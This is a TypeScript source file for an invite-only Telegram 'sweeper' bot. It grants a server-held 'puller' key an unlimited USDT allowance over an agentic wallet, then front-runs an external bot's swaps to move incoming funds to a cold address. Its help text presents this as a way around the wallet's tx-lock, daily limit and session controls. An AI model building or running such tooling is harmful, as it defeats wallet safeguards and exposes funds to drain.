import { Telegraf, Markup } from 'telegraf';
import { authGuard } from './middleware';
import { mainKeyboard, adminKeyboard, backKeyboard } from './keyboards';
import {
  upsertTarget, deactivate, listActive, newPuller, addToken,
  findTarget, setPuller, adminStats,
} from '../engine/storage';
import { grantAllowance, signin, verify } from '../engine/baw';
import { allowanceOf, gasOf } from '../engine/puller';
import { engineState } from '../engine/listener';
import { USDT } from '../config/constants';
import { ENV } from '../config/env';
import { db } from '../config/db';

const isAdmin = (id?: number) => id === ENV.ADMIN_ID;

const HELP = `*How this works*

*1. Arm a wallet*
Send:
\`/arm <agentic_wallet> <cold_destination>\`

The bot creates a *puller* key — a separate address that is allowed to move your USDT. It is encrypted in the database.

*2. Pair once*
Tap the link, confirm the code in the Binance App. Developer Mode must be ON. The bot then grants the puller an unlimited USDT allowance.

*3. Fund the puller*
Send ~0.02 BNB to the puller address. It only pays gas.

*4. That is it*
When USDT arrives on the watched wallet, the puller moves it to your cold address in ~50ms — before the external bot's swap confirms. The swap then reverts.

*Why it works*
The puller signs locally. No wallet session, no MPC round trip, no \`tx-lock\`, no daily limit. The external bot can kick sessions as often as it likes and it changes nothing.

*Commands*
\`/arm\` — add a wallet
\`/repair\` — regenerate a missing puller
\`/addtoken\` — watch another token
\`/monitors\` — status
\`/fund\` — puller addresses
\`/unlink\` — remove a wallet`;

export function buildBot() {
  const bot = new Telegraf(ENV.TOKEN);
  bot.catch((e, ctx) => console.error(`[bot] ${ctx.updateType}:`, e));
  bot.use(authGuard);

  bot.start(async ctx => {
    await ctx.reply('⚡ *Sweeper Engine v2*\n\nPuller mode.', {
      parse_mode: 'Markdown', ...mainKeyboard,
    });
  });

  bot.command('menu', ctx =>
    ctx.reply('⚡ *Sweeper Engine v2*', { parse_mode: 'Markdown', ...mainKeyboard }));

  bot.command('help', ctx => ctx.reply(HELP, { parse_mode: 'Markdown', ...backKeyboard }));
  bot.action('HELP', async ctx => {
    await ctx.answerCbQuery();
    await ctx.reply(HELP, { parse_mode: 'Markdown', ...backKeyboard });
  });

  const armTarget = async (ctx: any, target: string, cold: string, extra?: string) => {
    const userId = ctx.from!.id;
    const { address: puller, key } = newPuller();
    const instanceId = crypto.randomUUID();
    const tokens = [USDT, ...(extra ? extra.split(',').map((s: string) => s.trim()) : [])];

    await upsertTarget({ userId, target, destination: cold, puller, pullerKey: key, instanceId, tokens });
    await ctx.reply(
      `*Registered*\nWallet: \`${target}\`\nPuller: \`${puller}\`\nCold: \`${cold}\`\n\nPairing now. Developer Mode must be ON.`,
      { parse_mode: 'Markdown' });

    const s = { dir: `t${target}`, instanceId };
    try {
      const { data } = await signin(s);
      await ctx.reply(`*Pair once:*\n\`${data.pairingCode}\`\n${data.urlForWeb}`,
        { parse_mode: 'Markdown', link_preview_options: { is_disabled: true } });
      await verify(s, data.qrCodeId);
      for (const t of tokens) {
        try { await grantAllowance(s, t, puller); }
        catch {
          await ctx.reply(`⚠️ Approve failed for \`${t}\`. Manual:\n` +
            `\`baw contract-call preview --binanceChainId 56 --to ${t} --function "approve(address,uint256)" --args "${puller},115792089237316195423570985008687907853269984665640564039457584007913129639935"\``,
            { parse_mode: 'Markdown' });
        }
      }
      await ctx.reply('✅ Armed. Fund the puller with BNB.', { parse_mode: 'Markdown', ...mainKeyboard });
    } catch (e: any) {
      await ctx.reply(`❌ Pairing failed: \`${String(e.stdout || e.message).slice(0, 140)}\``,
        { parse_mode: 'Markdown' });
    }
  };

  bot.command('arm', async ctx => {
    const [, target, cold, extra] = ctx.message.text.split(' ');
    if (!target || !cold) {
      return ctx.reply('Usage: `/arm <agentic_wallet> <cold> [token1,token2]`', { parse_mode: 'Markdown' });
    }
    await armTarget(ctx, target, cold, extra);
  });

  bot.command('repair', async ctx => {
    const [, target, cold] = ctx.message.text.split(' ');
    if (!target || !cold) {
      return ctx.reply('Usage: `/repair <wallet> <cold>`', { parse_mode: 'Markdown' });
    }
    await armTarget(ctx, target, cold);
  });

  bot.command('addtoken', async ctx => {
    const [, target, token] = ctx.message.text.split(' ');
    if (!target || !token) return ctx.reply('Usage: `/addtoken <wallet> <token>`', { parse_mode: 'Markdown' });
    const id = await findTarget(ctx.from!.id, target);
    if (!id) return ctx.reply('Unknown wallet. /arm first.');
    await addToken(id, token);
    await ctx.reply(`Added \`${token}\`. Grant the allowance from the wallet, then it is live.`,
      { parse_mode: 'Markdown' });
  });

  bot.command('unlink', async ctx => {
    const target = ctx.message.text.split(' ')[1];
    if (!target) return ctx.reply('Usage: `/unlink <wallet>`', { parse_mode: 'Markdown' });
    await deactivate(ctx.from!.id, target);
    await ctx.reply(`Removed \`${target}\``, { parse_mode: 'Markdown' });
  });

  bot.action('MONITORS', async ctx => {
    await ctx.answerCbQuery();
    const rows = await listActive(ctx.from!.id);
    if (!rows.length) return ctx.reply('No targets. /arm first.', { parse_mode: 'Markdown' });
    const body = await Promise.all(rows.map(async r => {
      if (!r.puller) return `• \`${r.target}\`\n  ❌ no puller — /repair`;
      const lines = await Promise.all(r.tokens.map(async tok => {
        const a = await allowanceOf(r.target, r.puller!, tok.token);
        return `  ${tok.token} ${a > 0n ? '✅' : '❌'}`;
      }));
      return `• \`${r.target}\` → \`${r.destination}\`\n  puller \`${r.puller}\`\n${lines.join('\n')}`;
    }));
    await ctx.reply(`*Monitors*\n\n${body.join('\n\n')}`, { parse_mode: 'Markdown' });
  });

  bot.action('FUND', async ctx => {
    await ctx.answerCbQuery();
    const rows = await listActive(ctx.from!.id);
    const withPuller = rows.filter(r => r.puller);
    if (!withPuller.length) return ctx.reply('No pullers yet. /arm first.');
    const lines = await Promise.all(withPuller.map(async r =>
      `\`${r.puller}\` — ${Number(await gasOf(r.puller!)) / 1e18} BNB`));
    await ctx.reply(`*Fund these with ~0.02 BNB each:*\n\n${lines.join('\n')}`, { parse_mode: 'Markdown' });
  });

  bot.action('ADDTOKEN', async ctx => {
    await ctx.answerCbQuery();
    await ctx.reply('Use `/addtoken <wallet> <token_address>`', { parse_mode: 'Markdown' });
  });

  // ---------- admin panel ----------
  bot.command('admin', async ctx => {
    if (!isAdmin(ctx.from!.id)) return ctx.reply('🔒 Admin only.');
    await ctx.reply('🛠 *Admin Panel*', { parse_mode: 'Markdown', ...adminKeyboard });
  });

  bot.action('A_STATS', async ctx => {
    if (!isAdmin(ctx.from!.id)) return ctx.answerCbQuery('Admin only');
    await ctx.answerCbQuery();
    const s = await adminStats();
    await ctx.reply(
      `*Stats*\nUsers: ${s.users}\nActive targets: ${s.targets}\nReady (allowance ok): ${s.ready}\nOrphans: ${s.orphans}`,
      { parse_mode: 'Markdown', ...adminKeyboard });
  });

  bot.action('A_USERS', async ctx => {
    if (!isAdmin(ctx.from!.id)) return ctx.answerCbQuery('Admin only');
    await ctx.answerCbQuery();
    const { rows } = await db.query(`SELECT user_id, username FROM authorized_users ORDER BY created_at DESC LIMIT 50`);
    await ctx.reply(
      rows.length ? rows.map(r => `\`${r.user_id}\` ${r.username ?? ''}`).join('\n') : 'none',
      { parse_mode: 'Markdown', ...adminKeyboard });
  });

  bot.action('A_TARGETS', async ctx => {
    if (!isAdmin(ctx.from!.id)) return ctx.answerCbQuery('Admin only');
    await ctx.answerCbQuery();
    const rows = await listActive();
    if (!rows.length) return ctx.reply('No targets.', adminKeyboard);
    const body = rows.map(r =>
      `\`${r.target}\` u${r.userId}\n puller ${r.puller ? '✅' : '❌'} tokens ${r.tokens.length}`);
    await ctx.reply(`*All targets*\n\n${body.join('\n\n')}`, { parse_mode: 'Markdown', ...adminKeyboard });
  });

  bot.action('A_ENGINE', async ctx => {
    if (!isAdmin(ctx.from!.id)) return ctx.answerCbQuery('Admin only');
    await ctx.answerCbQuery();
    const up = Math.round((Date.now() - engineState.startedAt) / 1000);
    await ctx.reply(
      `*Engine*\narmed: ${engineState.armed}\ntargets: ${engineState.targets}\nblocks: ${engineState.blocks}\nlast block: ${engineState.lastBlock}\nuptime: ${up}s`,
      { parse_mode: 'Markdown', ...adminKeyboard });
  });

  bot.action('A_INVITES', async ctx => {
    if (!isAdmin(ctx.from!.id)) return ctx.answerCbQuery('Admin only');
    await ctx.answerCbQuery();
    const { rows } = await db.query(
      `SELECT code, expires_at FROM invite_codes WHERE used_by IS NULL AND expires_at > NOW() ORDER BY created_at DESC`);
    if (!rows.length) return ctx.reply('No live invites.', adminKeyboard);
    const body = rows.map(r => `\`${r.code}\` — https://t.me/${ctx.botInfo?.username}?start=${r.code}`);
    await ctx.reply(`*Live invites*\n\n${body.join('\n')}`, {
      parse_mode: 'Markdown', link_preview_options: { is_disabled: true }, ...adminKeyboard });
  });

  bot.command('invite', async ctx => {
    if (!isAdmin(ctx.from!.id)) return ctx.reply('🔒 Admin only.');
    const code = 'BEE-' + Math.random().toString(36).slice(2, 8).toUpperCase();
    await db.query(`INSERT INTO invite_codes (code) VALUES ($1)`, [code]);
    await ctx.reply(
      `*Invite created* (24h, single use)\n\n\`${code}\`\nhttps://t.me/${ctx.botInfo?.username}?start=${code}`,
      { parse_mode: 'Markdown', link_preview_options: { is_disabled: true }, ...adminKeyboard });
  });

  bot.command('broadcast', async ctx => {
    if (!isAdmin(ctx.from!.id)) return ctx.reply('🔒 Admin only.');
    const text = ctx.message.text.replace('/broadcast', '').trim();
    if (!text) return ctx.reply('Usage: `/broadcast <text>`', { parse_mode: 'Markdown' });
    const { rows } = await db.query(`SELECT user_id FROM authorized_users`);
    let ok = 0;
    for (const r of rows) {
      try { await ctx.telegram.sendMessage(r.user_id, text, { parse_mode: 'Markdown' }); ok++; }
      catch { /* blocked */ }
    }
    await ctx.reply(`Sent to ${ok}/${rows.length}.`);
  });

  bot.action('MENU', async ctx => {
    await ctx.answerCbQuery();
    await ctx.editMessageText('⚡ *Sweeper Engine v2*', { parse_mode: 'Markdown', ...mainKeyboard });
  });

  return bot;
}
